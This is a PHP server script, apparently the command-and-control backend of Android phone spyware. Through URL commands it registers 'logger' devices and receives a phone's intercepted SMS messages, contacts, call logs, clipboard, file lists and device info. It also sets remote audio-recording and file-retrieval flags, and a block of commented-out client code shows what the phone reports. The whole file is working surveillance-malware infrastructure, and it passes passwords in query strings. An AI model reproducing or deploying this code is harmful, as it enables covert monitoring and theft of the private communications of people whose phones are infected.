==><?PHP

$ses = 1;
include("functions.php");
$usr = strtolower(urldecode(isset($_GET['usr']) ? $_GET['usr'] : null));
$pwd = urldecode(isset($_GET['pwd']) ? $_GET['pwd'] : null);


$name = isset($_GET['name']) ? $_GET['name'] : null;
$dID = isset($_GET['dID']) ? $_GET['dID'] : null;
$gID = isset($_GET['gID']) ? $_GET['gID'] : null;
$act = isset($_GET['act']) ? $_GET['act'] : null;
$sms = isset($_GET['sms']) ? $_GET['sms'] : null;
$from = isset($_GET['from']) ? $_GET['from'] : null;
$dt = isset($_GET['dt']) ? $_GET['dt'] : null;
$contacts = isset($_POST['contacts']) ? $_POST['contacts'] : null;
//echo file_get_contents("php://input");
//print_r($_GET);

if ($act == 'login') {
    $res = login($usr, $pwd);
} elseif ($act == 'list') {
    $res = listDevices($usr);
} elseif ($act == 'addlogger') {
    $res = addDevice($usr, $dID, $name, $gID);
} elseif ($act == 'update') {
    $res = updateDevice($usr, $dID, $name, $gID);
} elseif ($act == 'remove') {
    $res = removeDevice($name, $usr);
} elseif ($act == 'exist') {
    $res = chk_exist($usr);
} elseif ($act == 'register') {
    $res = register($usr, $pwd);
} else {
    if (login($usr, $pwd) && isowner($name, $usr)) {
        $res = putEVar($name, array('l_active' => $dt));
        if ($act == 'actget') {
            $res = getAct($name);
        } elseif ($act == 'actremove') {
            $res = removeAct($name);
        } elseif ($act == 'active') {
            //$res = putEVar($name, array('l_active' => $dt));
        } elseif ($act == 'addlog') {
            putEVar($name, array('l_sms' => $dt));
            $res = putLatestSMS($name, $sms, $dt, $from);
        } elseif ($act == 'synccontacts') {
            putEVar($name, array('l_contacts' => $dt));
            $res = putContacts($name, file_get_contents("php://input"));
        } elseif ($act == 'sms') {
            putEVar($name, array('l_smsbox' => $dt));
            $res = putSMSBox($name, urlencode(file_get_contents("php://input")));
        } elseif ($act == 'listfiles') {
            putEVar($name, array('l_files' => $dt));
            $res = putFileList($name, urlencode(file_get_contents("php://input")));
        } elseif ($act == 'info') {
            putEVar($name, array('l_info' => $dt));
            $res = putInfo($name, file_get_contents("php://input"));
        } elseif ($act == 'calllogs') {
            putEVar($name, array('l_call' => $dt));
            $res = putCallLogs($name, file_get_contents("php://input"), $dt);
        } elseif ($act == 'syncclpbrd') {
            $res = putEVar($name, array('clpbrd' => (file_get_contents("php://input"))));
        } elseif ($act == 'srstatus') {
            $res = putEVar($name, array('isnotrecording' => $_GET['recstop'], 'arsource' => $_GET['source'], 'l_sr' => $dt));
        } elseif ($act == 'getfile') {
            $res = putEVar($name, array('file' => $_GET['filename']));
        }
        // elseif ($act == 'installedapps') $res = putInstalledList($name, urlencode(file_get_contents("php://input")));
        /*
        * snd("smsstatus","success=" & Success & "&error=" & ErrorMessage & "&phone=" & PhoneNumber)
        * snd("getvolumes", "data=" & su.EncodeUrl("0=" & p.GetVolume(0) & ":1=" & p.GetVolume(1) & ":2=" & p.GetVolume(2) & ":3=" & p.GetVolume(3) & ":4=" & p.GetVolume(4) & ":5=" & p.GetVolume(5) & "|0=" & p.GetMaxVolume(0) & ":1=" & p.GetMaxVolume(1) & ":2=" & p.GetMaxVolume(2) & ":3=" & p.GetMaxVolume(3) & ":4=" & p.GetMaxVolume(4) & ":5=" & p.GetMaxVolume(5),"UTF8"))
        * sndfile("installedapps","data.txt")
        * snd("mpget","duration=" &MPp.Duration & "&looping=" & MPp.Looping & "&position=" & MPp.Position)
        * snd("tooglestatus","1=" & TG.WiFi & "&3=" & TG.RingerMode & "&4=" & TG.GPS & "&5=" & TG.DataConnection & "&7=" & TG.Bluetooth & "&8=" & TG.AirplaneMode )
        * sndfilesd("getfile",splt(i).SubString(7))
        * "&filename=" &su.EncodeUrl(filename, "UTF8") ,File.DirRootExternal, filename)
        */

    } else {
        $res = "-1";
    }
}
echo $res;

?><==